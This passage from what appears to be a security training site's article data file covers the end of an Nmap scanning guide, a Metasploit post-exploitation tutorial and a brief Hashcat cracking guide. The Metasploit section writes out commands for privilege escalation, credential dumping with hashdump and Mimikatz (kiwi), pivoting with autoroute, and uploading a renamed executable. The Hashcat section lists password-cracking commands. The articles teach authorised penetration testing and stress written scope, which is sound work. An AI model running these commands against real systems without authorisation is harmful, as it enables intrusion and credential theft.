Two categories deserve care. \`safe\` scripts do not crash services or use significant bandwidth. \`intrusive\` ones might — and \`vuln\` pulls in a number of them. \`--script vuln\` against a production box during business hours is a real way to cause an outage you will have to explain. Read what a script does before you point it at something you do not own:

\`\`\`
nmap --script-help ssl-enum-ciphers
\`\`\`

## Speed, and what you trade for it

\`\`\`
nmap -T4 target                    # a sensible default on a good network
nmap --min-rate 1000 target        # at least 1,000 packets per second
nmap -p- --min-rate 5000 target    # all 65,535 ports, fast, on a LAN
\`\`\`

\`-T0\` through \`-T5\` set timing templates. \`-T4\` is the usual choice; \`-T5\` is aggressive enough that on a congested link or through a rate-limiting firewall it will start **missing open ports** — Nmap gives up on a retransmit before the answer arrives. A fast scan that misses a service is worse than a slow one, because you will write "not exposed" in a report and be wrong.

\`--min-rate\` is the more honest control: it sets a packet rate floor rather than a vague aggression level, and it makes your scans reproducible. If you are scanning across the internet rather than a LAN, start lower and watch for a rising \`filtered\` count — that is the signal you are being rate-limited and your results are degrading.

## Output you can actually use later

\`\`\`
nmap -oA scan-2026-09-13 target.example.com
\`\`\`

\`-oA\` writes all three formats at once: \`.nmap\` (what you saw on screen), \`.gnmap\` (one line per host, for \`grep\` and \`awk\`), and \`.xml\`.

Take the XML seriously. It is the format every other tool reads — report generators, \`ndiff\`, and anything that wants structured findings. And with two scans you can diff them:

\`\`\`
ndiff monday.xml friday.xml
\`\`\`

That output — what opened, what closed, what changed version between two dates — is more useful to most organisations than any single scan. A port that appeared on Friday is an event. A port that was there both times is inventory.

## A workflow that scales past one host

For anything bigger than a single machine, scan in two passes.

\`\`\`
# 1. Who is alive?
nmap -sn 10.0.0.0/16 -oG alive.gnmap
grep "Status: Up" alive.gnmap | awk '{print $2}' > live-hosts.txt

# 2. What is on them? Fast and wide first.
nmap -iL live-hosts.txt -p- --min-rate 2000 -oA wide

# 3. Version and script detail, only on the ports you actually found.
nmap -iL live-hosts.txt -p 22,80,443,3306,8080 -sV -sC -oA deep
\`\`\`

The mistake is running \`-A -p-\` against a whole range in one go. It takes days, it is loud enough to generate tickets, and it produces one enormous file nobody reads. Wide-and-shallow, then narrow-and-deep, gets the same information in a fraction of the time.

## Before you scan anything

Port scanning a host you do not own or have written permission to test is unlawful in many jurisdictions, and "I was only looking" has not been a successful defence. Get authorisation in writing, keep the scope in the document, and stay inside it. \`scanme.nmap.org\` exists precisely so that people can practise legally — the Nmap project maintains it for that purpose, and asks that you not hammer it.

On your own infrastructure, none of this applies and you should be scanning it regularly. The asset you do not know about is the one that gets you.

## Running this without the local setup

Everything above runs on an Nmap install you maintain yourself, and that is a perfectly good way to work. If you would rather not maintain it, CyberSec Pro runs Nmap — with the flags above, on a generated form, with the command shown before it executes — from a browser, and streams the output as it arrives. The scan runs server-side in a dedicated container, one process per job, and the result is stored so you can diff it against the next one.

Either way, the thinking is the same: know what the states mean, scan the whole port range at least once, and never trust a scan that was faster than the network.
    `,
  },
  "metasploit-exploitation": {
    slug: "metasploit-exploitation",
    title: "Metasploit Post-Exploitation: Meterpreter, Privilege Escalation and Pivoting",
    category: "Tools",
    date: "2026-02-15",
    author: "Semih Kilic",
    excerpt: "What to do once you have a session: orienting with getuid, escalating by enumeration rather than repetition, harvesting credentials responsibly, and pivoting to hosts you were never exposed to.",
    tags: ["metasploit", "post-exploitation", "meterpreter", "privilege-escalation"],
    content: `
## The session is the beginning, not the end

Landing an exploit is the part beginners celebrate and experienced testers treat as step one. A shell on one machine, as a low-privilege user, with no way back in if the connection drops, proves very little on its own. The value of an engagement is in what the session lets you demonstrate next: that you could become administrator, read the credentials that unlock the rest of the network, and reach systems that were never exposed to you directly. That is post-exploitation, and Meterpreter is the tool built for it.

This guide assumes you already have a Meterpreter session — if you do not, the companion guide covers getting one. Everything here runs at the \`meterpreter >\` prompt.

## Why Meterpreter, and not a plain shell

An exploit can hand you an ordinary command shell, and sometimes that is all you get. Meterpreter is worth choosing when you can because of *how* it runs: it lives in the memory of the process it landed in and never writes itself to disk, it speaks to you over an encrypted channel, and it exposes one consistent set of commands whether the target is Windows or Linux. A plain shell makes you fight the target's own tooling — different commands on every OS, everything written to disk, everything in the clear. Meterpreter gives you a stable platform to work from.

## Orient before you act

The first minute in a new session is for finding out where you are, not for firing commands:

\`\`\`bash
meterpreter > sysinfo        # OS, architecture, hostname, domain
meterpreter > getuid         # who you are running as
meterpreter > getpid        # which process you are living inside
meterpreter > ipconfig       # the target's networks — note ones you can't reach yet
\`\`\`

\`getuid\` decides your whole next move. If it already reports \`NT AUTHORITY\\SYSTEM\` or \`root\`, you skip privilege escalation entirely. If it reports an ordinary user, that is the first problem to solve. And \`ipconfig\` is where pivoting begins: a second network interface on the compromised host, on a subnet you could not touch from outside, is the map of where you go next.

## Getting from user to administrator

\`\`\`bash
meterpreter > getsystem
\`\`\`

\`getsystem\` tries a handful of known local privilege-escalation techniques and, on an unpatched or misconfigured host, may take you straight to SYSTEM. When it works, it is the fastest path. When it fails — and on a patched, modern system it usually does — the honest next step is enumeration, not repetition. Background the session and run a local exploit suggester:

\`\`\`bash
meterpreter > background
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > run
\`\`\`

That checks the session against local exploits the target may be vulnerable to and hands you a shortlist to try. Escalation on a well-maintained system is a research problem — which missing patch, which weak service permission, which misconfiguration — not a single magic command, and treating \`getsystem\` as if it always works is how beginners get stuck.

## Harvesting credentials — carefully

Once you are SYSTEM, credentials are the prize, because they turn one compromised host into access across the network:

\`\`\`bash
meterpreter > hashdump                 # local SAM password hashes
meterpreter > load kiwi                 # the in-memory Mimikatz extension
meterpreter > creds_all                 # cached credentials from memory
\`\`\`

Two cautions that matter on a real engagement. \`hashdump\` and \`kiwi\` read the most sensitive data on the machine, and on a monitored network they are exactly what an EDR is watching for — loading kiwi may be the loudest thing you do all day. And what you recover is client data under your custody: it belongs in the report and in an encrypted store, not left in your loot directory or pasted into a chat. Handle it like the liability it is.

## Reaching what you could not see: pivoting

This is the technique that turns a single foothold into a network compromise, and the reason \`ipconfig\` was the first thing you ran. If the host you own sits on a second subnet — say it can reach \`10.0.0.0/24\`, which you never could from outside — you can route traffic through it:

\`\`\`bash
meterpreter > run autoroute -s 10.0.0.0/24
meterpreter > background
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 10.0.0.0/24
msf6 > run
\`\`\`

\`autoroute\` tells the framework to send traffic for that subnet through your session, so Metasploit's own scanners and exploits now reach machines that were never exposed to you. Add a \`socks_proxy\` module on top and your other tools — a browser, sqlmap, anything that honours a SOCKS proxy — can reach the internal network too. This is the step where an assessment stops being about one server and starts being about the client's actual exposure.

## Files, screenshots, and gathering evidence

\`\`\`bash
meterpreter > download C:\\Users\\Administrator\\Desktop\\notes.txt
meterpreter > upload ./tool.exe C:\\Windows\\Temp\\report.exe
meterpreter > screenshot
meterpreter > pwd
\`\`\`

A pentest report is only as persuasive as its evidence. A screenshot of the target's desktop, the contents of a sensitive file, the output of \`getuid\` showing SYSTEM — these are what turn "the host was vulnerable" into "here is what an attacker would have taken". Collect proof as you go, and note the timestamps.

## Persistence, and why to be reluctant with it

Metasploit can install a mechanism that re-opens your session after a reboot. On a real client engagement you should be reluctant to use it, and never without explicit permission in the rules of engagement, because it means leaving a backdoor on a system you do not own. If it is in scope, it is also a cleanup obligation: whatever you install, you are responsible for removing, and an unremoved persistence mechanism is a finding against *you*. The safer habit is to document that persistence *was achievable* — you had the access to install it — rather than actually planting one.

## Clean up after yourself

Post-exploitation leaves traces, and a professional removes them:

- Delete files you uploaded (\`rm\` inside Meterpreter, or the target's own commands).
- Remove any persistence mechanism you were authorised to install.
- Record every change you made — accounts, files, services — so the client can verify the environment is back to where it started.

Leaving a lab dirty is a bad habit; leaving a client's production system dirty is a professional failure.

## The rule that sits above all of it

Every command here is illegal against a system you have not been authorised in writing to test, and the sensitive ones — credential dumping, persistence, pivoting to new hosts — are exactly the actions a rules-of-engagement document scopes explicitly. "I had a shell so I kept going" is not authorisation. Stay inside the written scope, and practise the whole chain against Metasploitable or a HackTheBox target until the workflow is muscle memory before you run it anywhere real.

## Running this without the local setup

Post-exploitation is where a self-managed Metasploit install earns its keep, and running it yourself is a fine way to work. If you would rather not maintain the framework and its extensions, CyberSec Pro runs Metasploit's modules from a browser — module and options on a form, the command shown before it runs, output streamed back — with each job in its own container and any credentials you supply held in memory for that job alone and never written to disk. The discipline is unchanged: orient first, escalate by enumeration rather than repetition, treat harvested credentials as client property, and clean up everything you touched.
    `,
  },
  "hashcat-password-cracking": {
    slug: "hashcat-password-cracking",
    title: "Hashcat: GPU-Accelerated Password Cracking Mastery",
    category: "Tools",
    date: "2026-01-28",
    author: "Semih Kilic",
    excerpt: "Advanced Hashcat techniques for password auditing — hash modes, rule-based attacks, and optimization.",
    tags: ["hashcat", "password-cracking", "hash-cracking", "security-audit"],
    content: `
## Introduction

Hashcat is the world's fastest password recovery utility. It supports GPU acceleration and over 300 hash types.

## Hash Modes

- **MD5:** -m 0
- **NTLM:** -m 1000
- **SHA-256:** -m 1400
- **sha512crypt:** -m 1800
- **bcrypt:** -m 3200

## Attack Modes

### Dictionary Attack
- **Basic:** hashcat -m 0 -a 0 hashes.txt wordlist.txt
- **With rules:** hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule

### Mask Attack
- **Unknown chars:** hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l
  - ?l = lowercase, ?u = uppercase, ?d = digit, ?s = special

### Hybrid Attack
- **Word + mask:** hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d?d
- **Mask + word:** hashcat -m 0 -a 7 hashes.txt ?d?d?d?d wordlist.txt

## Optimization

- **GPU selection:** -d 1
- **Speed optimization:** -O
- **Session management:** --session=mysession
- **Restore session:** --session=mysession --restore

## Conclusion

Hashcat is essential for password security auditing. Use it to verify password policies.
    `,
  },
};
